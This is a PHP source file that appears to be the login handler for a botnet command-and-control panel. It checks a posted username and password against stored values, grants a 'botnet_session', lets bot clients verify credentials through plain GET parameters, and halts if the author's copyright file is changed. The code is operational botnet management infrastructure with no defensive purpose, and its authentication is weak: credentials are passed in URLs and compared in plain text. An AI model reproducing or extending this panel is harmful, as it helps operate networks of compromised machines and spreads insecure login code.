<?
session_start();
include("../includes/configuration.inc.php");
if(isset($_SESSION['botnet_session']))
{
if($_SESSION['botnet_session'] == $security_token) 
{
echo "<script>window.location='panel';</script>";
}
}
?>
<?
if(file_exists("../mustafa.php")) 
{
$checker = fopen("../mustafa.php","r");
$copyrights = fgets($checker);
if ($copyrights != "mustafa Taktak") 
{
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
}else {
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
?>
<?
if(!isset($_GET['client'])) {
$username = $_POST['username'];
$password = $_POST['password'];
if($username == $usernamec) 
{
if($password == $passwordc) 
{
$_SESSION['botnet_session'] = $security_token;
echo "<script>window.location='index.php';</script>";
}else {
echo "<script>window.location='../index.php?error=2';</script>";
}
}
else {
echo "<script>window.location='../index.php?error=1';</script>";
}
} else {
$usernameg = $_GET['username'];
$passwordg = $_GET['password'];
if($usernameg == $usernamec) 
{
if($passwordg == $passwordc) 
{
echo "true";
}else {
echo "false";
}
} else {
echo "false";
}
}
?>